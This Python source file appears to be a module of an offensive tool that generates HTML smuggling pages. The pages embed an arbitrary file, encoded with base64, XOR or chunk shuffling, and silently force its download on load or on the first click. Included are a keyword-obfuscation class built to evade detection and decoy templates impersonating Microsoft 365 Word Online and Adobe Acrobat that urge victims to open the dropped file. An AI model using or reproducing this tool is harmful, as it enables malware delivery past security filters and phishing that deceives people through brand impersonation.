import os
import re
import base64
import html
import random
from config import OUTPUT_DIR


class JSObfuscator:
    """JS 关键词规避：将敏感关键词替换为 String.fromCharCode 动态构造"""

    @staticmethod
    def _to_char_code(s):
        chars = ",".join([str(ord(c)) for c in s])
        return f"String.fromCharCode({chars})"

    @staticmethod
    def obfuscate(js_code):
        replacements = {"atob": "atob", "Blob": "Blob", "URL": "URL", "fetch": "fetch", "Uint8Array": "Uint8Array"}
        for key, val in replacements.items():
            char_code = JSObfuscator._to_char_code(val)
            pattern_new = r"\bnew\s+" + re.escape(key) + r"\b"
            js_code = re.sub(pattern_new, f"new window[{char_code}]", js_code)
            pattern_call = r"(?<!\.)\b" + re.escape(key) + r"\s*\("
            js_code = re.sub(pattern_call, f"window[{char_code}](", js_code)

        dom_methods = ["createElement", "appendChild", "createObjectURL", "revokeObjectURL", "getElementById", "querySelector"]
        for method in dom_methods:
            char_code = JSObfuscator._to_char_code(method)
            pattern = r"\." + re.escape(method) + r"\s*\("
            js_code = re.sub(pattern, f"[{char_code}](", js_code)

        key_props = ["body", "style", "display", "href", "download", "click"]
        for prop in key_props:
            char_code = JSObfuscator._to_char_code(prop)
            pattern = r"\." + re.escape(prop) + r"\b"
            js_code = re.sub(pattern, f"[{char_code}]", js_code)

        return js_code

class HTMLGenerator:
    def generate_js_payload(self, file_path, download_name, mode, encoding_method="Standard Base64", key_length=16, chunk_size=4096, enable_evasion=False):
        """
        Generates the JS payload for smuggling.
        mode: "自动下载" / "点击任意位置下载" / "Embedded" (for SVG reuse)
        Returns (smuggling_code, meta_tags, extra_files)
        """
        if not file_path or not os.path.exists(file_path):
            raise ValueError("Invalid file path.")
        
        extra_files = []
        with open(file_path, "rb") as f:
            file_data = f.read()

        # Encode payload
        encoded_data, decoder_js = self._encode_payload(file_data, encoding_method, key_length, chunk_size)
        
        meta_tags = ""
        if "|" in encoded_data and "x-a" in decoder_js:
            key_hex, encoded_data = encoded_data.split("|", 1)
            meta_tags = self._get_meta_tags(key_hex)

        # --- Build JS based on trigger mode ---
        if "点击任意位置" in mode or "ClickAnywhere" in mode:
            # Click Anywhere Download Mode
            smuggling_code = f"""
            (function(){{
                var _triggered = false;
                
                {decoder_js}
                
                document.addEventListener('click', function(e){{
                    if(_triggered) return;
                    _triggered = true;
                    
                    var _data = `{encoded_data}`;
                    var _decoded = _decode(_data);
                    
                    var _B = window[String.fromCharCode(66,108,111,98)];
                    var _b = new _B([_decoded]);
                    var _a = document.createElement('a');
                    _a.href = URL.createObjectURL(_b);
                    _a.setAttribute(String.fromCharCode(100,111,119,110,108,111,97,100), '{download_name}');
                    document.body.appendChild(_a);
                    _a.click();
                    setTimeout(function(){{ URL.revokeObjectURL(_a.href); _a.remove(); }}, 200);
                }}, {{once: false}});
            }})();
            """
        else:
            # Auto Download / Click Image Download / Embedded (default trigger)
            smuggling_code = f"""
            {decoder_js}
            (function() {{
                var data = `{encoded_data}`;
                var blobData = _decode(data);
                var blob = new Blob([blobData], {{ type: 'application/octet-stream' }});
                var link = document.createElement('a');
                link.style.display = 'none';
                document.body.appendChild(link);
                var url = window.URL.createObjectURL(blob);
                link.href = url;
                link.download = '{download_name}';
                link.click();
                setTimeout(function() {{
                    window.URL.revokeObjectURL(url);
                    document.body.removeChild(link);
                }}, 100);
            }})();
            """

        if enable_evasion:
            smuggling_code = JSObfuscator.obfuscate(smuggling_code)

        return smuggling_code, meta_tags, extra_files

    def generate(self, file_path, image_url, download_name, mode, encoding_method="Standard Base64", key_length=16, chunk_size=4096, 
                 decoy_type="无 (None)", custom_template_path=None, enable_evasion=False):
        """
        Generates HTML Smuggling file.
        mode: "自动下载" / "点击任意位置下载"
        decoy_type: "无 (None)" / "Microsoft 365 文档预览" / "Adobe PDF在线查看" / "文件下载中 (File Download)" / "自定义 (Custom)"
        """
        if not download_name:
            raise ValueError("Download filename is required.")

        try:
            smuggling_code, meta_tags, extra_files = self.generate_js_payload(
                file_path, download_name, mode, encoding_method, key_length, chunk_size, enable_evasion
            )
            
            html_content = ""
            
            # --- Template Selection ---
            
            # 1. Microsoft 365 decoy
            if "Microsoft 365" in decoy_type:
                html_content = self._get_m365_template(smuggling_code, meta_tags)
            
            # 3. Adobe PDF decoy
            elif "Adobe PDF" in decoy_type:
                html_content = self._get_adobe_template(smuggling_code, meta_tags)
            
            # 4. File Download decoy
            elif "文件下载" in decoy_type or "File Download" in decoy_type:
                html_content = self._get_download_template(smuggling_code, meta_tags)
            
            # 5. Custom template
            elif "自定义" in decoy_type or "Custom" in decoy_type:
                if not custom_template_path:
                    raise ValueError("请选择自定义模板文件 (Custom template file is required)")
                if not os.path.exists(custom_template_path):
                    raise ValueError(f"自定义模板文件不存在: {custom_template_path}")
                html_content = self._get_custom_template(custom_template_path, smuggling_code, meta_tags)
            
            # 6. Default: None → minimal HTML
            else:
                html_content = f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>下载</title>
    {meta_tags}
    <style>body {{ display:none; }}</style>
</head>
<body>
<script>
{smuggling_code}
</script>
</body>
</html>"""
            
            # Write to file
            filename = os.path.join(OUTPUT_DIR, "html_smuggling.html")
            with open(filename, "w", encoding="utf-8") as f:
                f.write(html_content)
            
            if extra_files:
                return [os.path.abspath(filename)] + extra_files
            else:
                return os.path.abspath(filename)

        except Exception as e:
            raise Exception(f"Failed to generate HTML: {str(e)}")

    # ===== Encoding Methods =====

    def _encode_payload(self, file_data, method, key_length, chunk_size):
        """Encodes the payload and returns (encoded_string, decoder_js_code)"""
        if method == "Reverse + Base64":
            return self._encode_reverse_base64(file_data)
        elif method == "XOR + Base64":
            return self._encode_xor_base64(file_data, key_length)
        elif method == "Chunked Shuffle + Base64":
            return self._encode_chunked_base64(file_data, chunk_size)
        else: # Standard Base64
            b64 = base64.b64encode(file_data).decode()
            js = """
            function _decode(d) {
                var bin = atob(d);
                var buf = new Uint8Array(bin.length);
                for (var i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i);
                return buf;
            }
            """
            return b64, js

    def _encode_reverse_base64(self, file_data):
        reversed_data = file_data[::-1]
        b64 = base64.b64encode(reversed_data).decode()
        js = """
        function _decode(d) {
            var b = window[String.fromCharCode(97,116,111,98)](d);
            var arr = [];
            for (var i = 0; i < b.length; i++) arr.push(b.charCodeAt(i));
            arr.reverse();
            return new Uint8Array(arr);
        }
        """
        return b64, js

    def _encode_xor_base64(self, file_data, key_length):
        key = os.urandom(key_length)
        encrypted = bytes([file_data[i] ^ key[i % len(key)] for i in range(len(file_data))])
        b64 = base64.b64encode(encrypted).decode()
        key_hex = key.hex()
        return f"{key_hex}|{b64}", """
        function _decode(d) {
            var _k = document.querySelector('meta[name="x-a"]').content +
                     document.querySelector('meta[name="x-b"]').content +
                     document.querySelector('meta[name="x-c"]').content +
                     document.querySelector('meta[name="x-d"]').content;
            
            var raw = window[String.fromCharCode(97,116,111,98)](d);
            var kb = [];
            for (var i = 0; i < _k.length; i += 2) kb.push(parseInt(_k.substr(i, 2), 16));
            var out = new Uint8Array(raw.length);
            for (var i = 0; i < raw.length; i++) out[i] = raw.charCodeAt(i) ^ kb[i % kb.length];
            return out;
        }
        """

    def _encode_chunked_base64(self, file_data, chunk_size):
        if chunk_size <= 0: chunk_size = 4096
        chunks = [file_data[i:i+chunk_size] for i in range(0, len(file_data), chunk_size)]
        indices = list(range(len(chunks)))
        random.shuffle(indices)
        shuffled = b''.join(chunks[i] for i in indices)
        b64 = base64.b64encode(shuffled).decode()
        
        restore_order = [0] * len(indices)
        for new_pos, old_pos in enumerate(indices):
            restore_order[old_pos] = new_pos
            
        restore_order_str = str(restore_order)
        
        js = f"""
        function _decode(d) {{
            var order = {restore_order_str};
            var cs = {chunk_size};
            var raw = window[String.fromCharCode(97,116,111,98)](d);
            var buf = [];
            for (var i = 0; i < raw.length; i++) buf.push(raw.charCodeAt(i));
            var chunks = [];
            for (var i = 0; i < buf.length; i += cs) chunks.push(buf.slice(i, i + cs));
            var restored = new Array(chunks.length);
            for (var i = 0; i < order.length; i++) restored[i] = chunks[order[i]];
            var flat = [];
            restored.forEach(function(c) {{ flat = flat.concat(c); }});
            return new Uint8Array(flat);
        }}
        """
        return b64, js

    # ===== Meta Tags =====

    def _get_meta_tags(self, key_hex):
        if not key_hex: return ""
        k_len = len(key_hex)
        part_len = k_len // 4
        parts = [key_hex[i:i+part_len] for i in range(0, k_len, part_len)]
        while len(parts) > 4:
            parts[-2] += parts[-1]
            parts.pop()
        while len(parts) < 4:
            parts.append("")
        return f'''<meta name="x-a" content="{parts[0]}">
    <meta name="x-b" content="{parts[1]}">
    <meta name="x-c" content="{parts[2]}">
    <meta name="x-d" content="{parts[3]}">'''

    # ===== HTML Templates =====

    def _get_m365_template(self, smuggling_code, meta_tags):
        return f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
<title>Word 在线 - 文档.docx</title>
{meta_tags}
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{ font-family:'Segoe UI',sans-serif; background:#f3f2f1; }}
.header {{ 
    background:#0078d4; height:48px; display:flex; 
    align-items:center; padding:0 16px; color:white; 
}}
.header-logo {{ font-size:16px; font-weight:600; }}
.header-title {{ margin-left:16px; font-size:14px; opacity:0.9; }}
.toolbar {{ 
    background:#f3f2f1; border-bottom:1px solid #edebe9; 
    padding:4px 12px; font-size:12px; color:#323130; 
}}
.toolbar span {{ margin-right:20px; cursor:pointer; }}
.toolbar span:hover {{ color:#0078d4; }}
.container {{ display:flex; justify-content:center; padding:24px; }}
.page {{ 
    width:816px; min-height:1056px; background:white; 
    box-shadow:0 2px 8px rgba(0,0,0,0.12); padding:96px 72px; 
}}
.loading-overlay {{
    position:fixed; top:0; left:0; width:100%; height:100%;
    background:rgba(255,255,255,0.85); display:flex;
    flex-direction:column; align-items:center; justify-content:center;
    z-index:1000; transition:opacity 0.5s;
}}
.spinner {{
    width:32px; height:32px; border:3px solid #0078d4;
    border-top-color:transparent; border-radius:50%;
    animation:spin 0.8s linear infinite;
}}
@keyframes spin {{ to {{ transform:rotate(360deg); }} }}
.loading-text {{ margin-top:16px; color:#605e5c; font-size:14px; }}
.done-text {{ color:#107c10; font-size:14px; margin-top:12px; display:none; }}
.doc-content {{ color:#323130; line-height:1.6; font-size:11pt; }}
.doc-content h1 {{ font-size:16pt; color:#0078d4; margin-bottom:12px; }}
.doc-content p {{ margin-bottom:10px; }}
</style>
</head>
<body>
<div class="header">
    <div class="header-logo">&#9679; Word</div>
    <div class="header-title">文档.docx - 已保存到 OneDrive</div>
</div>
<div class="toolbar">
    <span>文件</span><span>开始</span><span>插入</span>
    <span>布局</span><span>审阅</span><span>视图</span>
</div>

<div class="loading-overlay" id="overlay">
    <div class="spinner"></div>
    <div class="loading-text">正在打开文档...</div>
    <div class="done-text" id="done">
        ✓ 文档已下载，请从下载文件夹中打开文件。
    </div>
</div>

<div class="container">
    <div class="page">
        <div class="doc-content">
            <h1>季度工作报告</h1>
            <p>本文档包含机密信息。如果文档无法正常显示，
            系统已自动将文件保存至您的下载文件夹。</p>
            <p>请检查下载文件夹并直接打开文件。</p>
        </div>
    </div>
</div>

<script>
{smuggling_code}

setTimeout(function(){{
    document.getElementById('done').style.display='block';
    document.querySelector('.spinner').style.display='none';
    document.querySelector('.loading-text').style.display='none';
    setTimeout(function(){{
        document.getElementById('overlay').style.opacity='0';
        setTimeout(function(){{
            document.getElementById('overlay').style.display='none';
        }},500);
    }},2000);
}},3000);
</script>
</body>
</html>"""

    def _get_adobe_template(self, smuggling_code, meta_tags):
         return f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
<title>Adobe Acrobat - 查看 PDF</title>
{meta_tags}
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{ font-family:'Adobe Clean',Helvetica,sans-serif; background:#1c1c1c; }}
.header {{
    background:#2c2c2c; height:56px; display:flex;
    align-items:center; padding:0 20px; border-bottom:1px solid #3c3c3c;
}}
.logo {{ color:#fa0f00; font-size:20px; font-weight:bold; }}
.logo-text {{ color:white; margin-left:8px; font-size:14px; }}
.viewer {{
    display:flex; flex-direction:column; align-items:center;
    justify-content:center; height:calc(100vh - 56px); color:#999;
}}
.pdf-icon {{ font-size:64px; margin-bottom:20px; color:#fa0f00; }}
.message {{ font-size:16px; margin-bottom:8px; color:#ccc; }}
.sub-message {{ font-size:13px; color:#888; }}
.download-notice {{
    margin-top:24px; padding:12px 24px; background:#fa0f00;
    color:white; border-radius:20px; font-size:14px; font-weight:500;
    animation:pulse 2s infinite;
}}
@keyframes pulse {{
    0%,100% {{ opacity:1; }}
    50% {{ opacity:0.7; }}
}}
</style>
</head>
<body>
<div class="header">
    <span class="logo">&#9632;</span>
    <span class="logo-text">Adobe Acrobat Reader</span>
</div>
<div class="viewer">
    <div class="pdf-icon">&#128196;</div>
    <div class="message">正在准备文档预览...</div>
    <div class="sub-message">文件正在处理中，将自动下载。</div>
    <div class="download-notice" id="notice">正在下载加密文档...</div>
</div>
<script>
{smuggling_code}
setTimeout(function(){{
    document.getElementById('notice').textContent = '✓ 下载完成，请检查下载文件夹。';
    document.getElementById('notice').style.background = '#107c10';
    document.getElementById('notice').style.animation = 'none';
}},4000);
</script>
</body>
</html>"""

    def _get_download_template(self, smuggling_code, meta_tags):
        return f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
<title>安全文件传输</title>
{meta_tags}
<style>
* {{ margin:0; padding:0; }}
body {{
    font-family:'Segoe UI',sans-serif; background:#0a0a23;
    display:flex; align-items:center; justify-content:center;
    height:100vh; color:white;
}}
.card {{
    background:#16213e; border-radius:16px; padding:48px;
    text-align:center; box-shadow:0 20px 60px rgba(0,0,0,0.5);
    max-width:420px;
}}
.icon {{ font-size:48px; margin-bottom:20px; }}
.title {{ font-size:20px; font-weight:600; margin-bottom:8px; }}
.desc {{ font-size:13px; color:#a0a0a0; margin-bottom:24px; }}
.progress-bar {{
    width:100%; height:6px; background:#0a0a23;
    border-radius:3px; overflow:hidden; margin-bottom:16px;
}}
.progress-fill {{
    height:100%; width:0%; background:linear-gradient(90deg,#e94560,#533483);
    border-radius:3px; transition:width 0.3s;
}}
.status {{ font-size:12px; color:#a0a0a0; }}
.done {{ display:none; }}
.done .check {{ color:#00b894; font-size:48px; margin-bottom:12px; }}
</style>
</head>
<body>
<div class="card">
    <div id="loading">
        <div class="icon">&#128274;</div>
        <div class="title">安全文件传输</div>
        <div class="desc">正在为您准备加密文档下载。</div>
        <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
        <div class="status" id="status">解密中... 0%</div>
    </div>
    <div class="done" id="complete">
        <div class="check">&#10003;</div>
        <div class="title">下载完成</div>
        <div class="desc">文件已保存到您的下载文件夹。</div>
    </div>
</div>
<script>
{smuggling_code}

var pct = 0;
var prog = setInterval(function(){{
    pct += Math.random() * 15;
    if (pct > 100) pct = 100;
    document.getElementById('progress').style.width = pct + '%';
    document.getElementById('status').textContent = '解密中... ' + Math.floor(pct) + '%';
    if (pct >= 100) {{
        clearInterval(prog);
        setTimeout(function(){{
            document.getElementById('loading').style.display = 'none';
            document.getElementById('complete').style.display = 'block';
        }}, 500);
    }}
}}, 200);
</script>
</body>
</html>"""

    def _get_custom_template(self, template_path, smuggling_code, meta_tags):
        with open(template_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        if "<head>" in content and meta_tags:
            content = content.replace("<head>", f"<head>\n{meta_tags}")
        
        if "</body>" in content:
            content = content.replace("</body>", f"<script>\n{smuggling_code}\n</script>\n</body>")
        else:
            content += f"\n<script>\n{smuggling_code}\n</script>"
        
        return content
